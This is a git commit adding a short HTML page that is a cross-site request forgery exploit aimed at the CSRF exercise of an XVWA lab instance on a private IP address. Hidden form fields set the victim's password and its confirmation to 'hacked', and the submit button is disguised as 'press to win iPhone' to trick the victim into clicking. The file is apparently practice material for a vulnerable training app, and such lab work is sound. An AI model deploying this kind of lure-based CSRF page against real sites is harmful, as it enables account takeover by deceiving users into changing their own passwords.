636ca42708c8ac025cee0e2ffd1ecab7f831184f
Nadim Alzahrani <43927079+iNx0@users.noreply.github.com>
2022-06-26 14:12:22 +0300

    Add files via upload

---
+++ myPHP.php
@@ -0,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head dir="ltr" lang="en" >
+  <title>myPHP</title>
+  <meta charset="UTF-8" > 
+</head>
+<body>
+
+  <form action="http://192.168.1.70/xvwa/vulnerabilities/csrf/">
+        <div class="form-group"> 
+          <input type="hidden" placeholder="Enter new password" name="passwd" width="50%" value="hacked">
+          <input type="hidden" placeholder="Confirm new password" name="confirm" width="50%" value="hacked"> 
+          <button class="btn btn-default" type="submit" name="submit" value="submit">press to win iPhone</button>
+        </div> 
+  </form>
+
+ </body>
+</html>
